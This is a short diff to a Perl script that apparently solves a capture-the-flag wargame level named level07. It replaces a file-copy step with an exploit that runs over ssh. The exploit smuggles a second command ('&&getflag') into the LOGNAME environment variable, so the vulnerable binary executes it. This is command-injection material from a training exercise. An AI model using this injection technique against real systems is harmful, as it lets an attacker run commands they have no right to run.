@@ -7,8 +7,6 @@ $green = "\e[32m";
 $reset = "\e[0m";
 $user = "level07";
 
-$scp = "scp -q -P $port $user\@$ip:~/level07 .";
-print $red, $scp, $reset, "\n";
-system($scp);
-
-# LOGNAME=\&\&getflag
+$exploit = "LOGNAME=\\&\\&getflag && ./level07";
+print $red, $exploit, $reset, "\n";
+system("ssh -qp $port $user\@$ip '$exploit'");
